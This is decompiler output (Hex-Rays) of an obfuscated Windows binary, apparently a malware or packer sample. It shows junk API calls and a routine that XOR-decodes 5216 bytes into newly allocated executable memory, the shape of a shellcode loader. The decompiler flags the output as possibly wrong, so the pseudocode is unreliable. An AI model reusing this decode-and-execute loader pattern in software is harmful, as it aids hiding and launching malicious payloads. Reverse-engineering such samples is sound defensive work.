/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// BOOL __usercall start@<eax>(int@<eax>, int@<edx>, int@<ecx>, int@<ebx>, int@<edi>, int@<esi>, double@<st3>, double _ST5@<st2>, double _ST6@<st1>);
int sub_402EE2();

//-------------------------------------------------------------------------
// Data declarations

// extern int (__stdcall *GetSystemMetrics)(int nIndex);
// extern BOOL (__stdcall *GetMessageW)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
// extern HWND (__stdcall *GetDlgItem)(HWND hDlg, int nIDDlgItem);
// extern int (__stdcall *ReleaseDC)(HWND hWnd, HDC hDC);
// extern BOOL (__stdcall *DestroyWindow)(HWND hWnd);
// extern BOOL (__stdcall *PostMessageW)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern BOOL (__stdcall *UpdateLayeredWindow)(HWND hWnd, HDC hdcDst, POINT *pptDst, SIZE *psize, HDC hdcSrc, POINT *pptSrc, COLORREF crKey, BLENDFUNCTION *pblend, DWORD dwFlags);
// extern HWND (__stdcall *CreateWindowExW)(DWORD dwExStyle, LPCWSTR lpClassName, LPCWSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
// extern UINT_PTR (__stdcall *SetTimer)(HWND hWnd, UINT_PTR nIDEvent, UINT uElapse, TIMERPROC lpTimerFunc);
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern HMODULE (__stdcall *GetModuleHandleW)(LPCWSTR lpModuleName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern DWORD (__stdcall *GetLastError)();
// extern int (__stdcall *lstrlenW)(LPCWSTR lpString);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern BOOL (__stdcall *QueryPerformanceCounter)(LARGE_INTEGER *lpPerformanceCount);
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern BOOL (__stdcall *FreeLibrary)(HMODULE hLibModule);
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern int (__stdcall *lstrcmpiW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern HLOCAL (__stdcall *LocalAlloc)(UINT uFlags, SIZE_T uBytes);
// extern LPWSTR (__stdcall *GetCommandLineW)();


//----- (004016CC) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
BOOL __usercall start@<eax>(
        int a1@<eax>,
        int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<edi>,
        int a6@<esi>,
        double a7@<st3>,
        double _ST5@<st2>,
        double _ST6@<st1>)
{
  int v9; // ecx
  int v10; // esi
  WPARAM v11; // esi
  int v12; // ecx
  int v13; // ebx
  __int16 *v14; // esi
  int v15; // ebx
  UINT_PTR v16; // eax
  int v17; // ecx
  int v18; // ebx
  int v19; // esi
  UINT v20; // edx
  int v21; // edx
  int v22; // esi
  int v23; // esi
  DWORD CurrentProcessId; // eax
  LPARAM v25; // edx
  unsigned int v26; // edx
  int v27; // ecx
  int v28; // ebx
  HWND DlgItem; // eax
  int v30; // ecx
  int v31; // ebx
  int v32; // edx
  int v33; // edx
  UINT v34; // edx
  int v35; // edi
  DWORD v36; // edi
  int v37; // eax
  int v38; // ecx
  LPARAM v39; // edx
  int v40; // esi
  BOOL result; // eax
  int v42; // ecx
  int v43; // esi
  unsigned int v44; // ebx
  int v45; // edi
  int v46; // esi
  int v47; // edx
  int v48; // eax
  int v49; // ecx
  __int64 v52; // [esp-4Ch] [ebp-4Ch] BYREF
  int v53; // [esp-44h] [ebp-44h]
  int v54; // [esp-40h] [ebp-40h]
  int v55; // [esp-3Ch] [ebp-3Ch]
  int v56; // [esp-38h] [ebp-38h]
  int v57; // [esp-30h] [ebp-30h]
  int v58; // [esp-2Ch] [ebp-2Ch]
  LPCSTR v59; // [esp-28h] [ebp-28h]
  _BYTE v60[8]; // [esp-24h] [ebp-24h] BYREF
  _BYTE *v61; // [esp-1Ch] [ebp-1Ch]
  int v62; // [esp-Ch] [ebp-Ch]

  v35 = a4 | a5;
  v58 = a6;
  v57 = a1;
  v56 = a4 | 0xD3D7;
  DlgItem = GetDlgItem((HWND)0xC402FE84, -((~(v35 + a2 - a3) | a1) ^ ~(v35 + a2 - a3)));
  v53 = -(((a6 | 0xDAC2) - (a4 | 0xD3D7) - 50375) ^ (v35 & 0x1400 | 0xC0D8));
  v31 = ~(v30 | (unsigned int)DlgItem) + ((v30 - 206) & (v30 + (a4 | 0xD3D7)));
  HIBYTE(v52) = 0;
  strcpy((char *)&v52, "ÚØÕÙÑÖ");
  GetMessageW(0, (HWND)0xC5DCC2C3, v32 ^ 0xD8DA, 0xFAEFF5AC);
  v10 = v9 + (v53 ^ v31);
  lstrcmpiW(0, 0);
  GetCurrentProcess();
  v11 = v10 - v31;
  VirtualAlloc((LPVOID)0xD5D1, 0xB9728D5A, 0xD7u, 0xD7D5D4u);
  GetDlgItem((HWND)0xE054D962, v38);
  PostMessageW((HWND)0x8D0E7667, 0xD5u, v11, v39);
  ReleaseDC((HWND)0x89162BF5, (HDC)0xF0856C61);
  lstrlenW(0);
  GetLastError();
  lstrlenW(0);
  GetCommandLineA();
  GetModuleHandleW(0);
  LocalAlloc(v20, 0xE6B1BC76);
  v22 = v21 ^ ~v11;
  GetModuleHandleA(0);
  v23 = ~v22;
  FreeLibrary((HMODULE)0x88E93C41);
  v36 = HIDWORD(v52) + 55517 - v23;
  GetSystemMetrics(v36 + 53714);
  v37 = -QueryPerformanceCounter((LARGE_INTEGER *)0xC8B9D4AE);
  CreateWindowExW(
    v36,
    0,
    0,
    ~v23,
    52432,
    -825635889,
    v37,
    -740372526,
    (HWND)0xDECD,
    (HMENU)0xD0D7DCCD,
    (HINSTANCE)0xBBC45ED9,
    (LPVOID)0xD6);
  SetTimer((HWND)0xD7CA0395, 0xFBCF5F07, v34, (TIMERPROC)0x8AD11386);
  v48 = v58 - v57 - 206;
  v15 = (223 - v48) | 0xDBD2;
  v40 = -((v56 + 1 - (~v56 | ((_BYTE)v33 + 1 - ((v33 != -1) + (_BYTE)v58)) & 0xC6)) & v48) - 2;
  result = UpdateLayeredWindow(
             (HWND)0xF0D42A3B,
             (HDC)0xC0C7D9DB,
             (POINT *)0xD5C6D1D8,
             (SIZE *)0xD6,
             (HDC)0xCB,
             (POINT *)0xD7D3C4,
             0xDBCBD5DE,
             (BLENDFUNCTION *)0xCFC8C1,
             0xC0D3D2u);
  if ( !result )
  {
    v43 = v40 + 1;
    v44 = v42 + v15;
    v45 = 55290;
    GetCurrentThreadId();
    v59 = 0;
    do
    {
      v44 = -((__PAIR64__(v44, v26) - 0xCEDB0000D3C7i64) >> 32);
      v45 ^= 0xC7u;
    }
    while ( LoadLibraryA(v59) );
    v56 = 14275543;
    v55 = v43;
    v28 = -(v26 & (v44 - 1));
    v54 = -1026042417;
    v53 = v28 + 207;
    HIDWORD(v52) = v27 - v28;
    LODWORD(v52) = v28 + 207;
    CurrentProcessId = GetCurrentProcessId();
    v46 = -(v43 + 207)
        - (__CFADD__(PostMessageW((HWND)0x8B728952, CurrentProcessId + 192, 0xCAD5D4u, v25), 57035)
         + 205);
    GetCurrentProcessId();
    GetModuleFileNameA((HMODULE)0xB3CA054F, (LPSTR)(v47 | 0xC9), -((v47 | 0xC9) ^ v46));
    ReleaseDC((HWND)0x8578F818, (HDC)0x8E0209BD);
    v16 = SetTimer((HWND)0x99554C52, 0xA5DA8EAC, 0xCED4C9D7, (TIMERPROC)0xF9121FFE);
    v18 = (v17 | 0xD9D3D6) + 213;
    v19 = -v16 ^ 0xCBC5 | 0xC01E;
    DestroyWindow((HWND)0xFF4FF41E);
    v13 = v12 | v18;
    v14 = (__int16 *)(v19 & 0xD3);
    sub_402EE2();
    _ST4 = ((double)*v14
          - ((double)*v14
           - ((double)*v14
            - ((double)*v14
             - ((double)*v14
              - ((double)*v14
               - ((double)*v14
                - a7)
               - (double)*v14)))
            - (double)*v14)))
         * (double)*(__int16 *)(v49 + 1702961334);
    __asm { fstp    st(5) }
    *(_WORD *)(v13 + 4) = __FS__;
    MEMORY[0xF941F92A] &= (unsigned int)v60;
    _EDI = v62;
    *v61 &= v60[1];
    __asm
    {
      fstp    st(5)
      fstp    st(5)
      rep or edi, 2EDDDD1Eh
    }
    JUMPOUT(0x401AA7);
  }
  return result;
}
// 40189E: positive sp value 24 has been found
// 401AA3: control flows out of bounds to 401AA7
// 401551: variable 'v30' is possibly undefined
// 40157F: variable 'v32' is possibly undefined
// 40104E: variable 'v9' is possibly undefined
// 401801: variable 'v38' is possibly undefined
// 40181B: variable 'v39' is possibly undefined
// 4012A8: variable 'v20' is possibly undefined
// 4012B0: variable 'v21' is possibly undefined
// 40168A: variable 'v34' is possibly undefined
// 4015F8: variable 'v33' is possibly undefined
// 401453: variable 'v26' is possibly undefined
// 401323: variable 'v27' is possibly undefined
// 401344: variable 'v25' is possibly undefined
// 401937: variable 'v47' is possibly undefined
// 401240: variable 'v17' is possibly undefined
// 4010F4: variable 'v12' is possibly undefined
// 401A66: variable 'v49' is possibly undefined
// 4018A4: variable 'v42' is possibly undefined

//----- (00402EE2) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int sub_402EE2()
{
  int v0; // edx
  int v1; // ebx
  _BYTE *v3; // esi
  _BYTE *v4; // ecx
  _BYTE *v5; // [esp+4h] [ebp-4h]

  GetCommandLineW();
  GetCurrentProcess();
  LocalAlloc(0xC2C1u, 0xA12F1DAC);
  v3 = v5;
  v4 = VirtualAlloc(0, 0x6A6Fu, 0x3000u, 0x40u);
  v0 = 5216;
  do
  {
    v1 = 218;
    BYTE1(v1) = -(__ROL1__(*v3, 22) ^ 0x77);
    *v4 = BYTE1(v1);
    ++v3;
    ++v4;
    --v0;
  }
  while ( v0 );
  return ((v1 != 0) - v1 - 1859072666 - (-v1 ^ 0xDE)) ^ 0xDC;
}
// 4032E2: positive sp value 4 has been found
// 403513: variable 'v5' is possibly undefined

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
